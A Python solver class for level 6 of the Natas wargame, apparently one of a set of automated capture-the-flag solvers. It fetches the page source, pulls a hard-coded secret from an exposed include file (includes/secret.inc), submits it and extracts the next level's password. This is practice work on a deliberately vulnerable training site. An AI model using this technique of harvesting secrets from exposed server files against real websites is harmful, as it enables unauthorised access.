import re
from .base_solver import NatasSolver

class Natas6Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # First get source code
            source_response = self.make_request("index-source.html")
            secret = None
            
            # Try to find secret in source
            if "$secret = " in source_response.text:
                secret_match = re.findall(r'\$secret = "([^"]+)"', source_response.text)
                if secret_match:
                    secret = secret_match[0]
            
            # If not found, try includes file
            if not secret:
                secret_response = self.make_request("includes/secret.inc")
                secret_match = re.findall(r'\$secret = "([^"]+)"', secret_response.text)
                if secret_match:
                    secret = secret_match[0]
                else:
                    raise ValueError("Could not find secret in any source")

            # Submit the form with secret
            response = self.make_request(
                method="POST",
                data={"secret": secret, "submit": "submit"}
            )
            
            # Extract password using more precise regex
            match = re.findall(r"Access granted. The password for natas7 is ([^<\s]+)", response.text)
            if not match:
                raise ValueError("Could not find password")
            return match[0].strip()

        except Exception as e:
            raise RuntimeError(f"Failed to solve natas6: {str(e)}")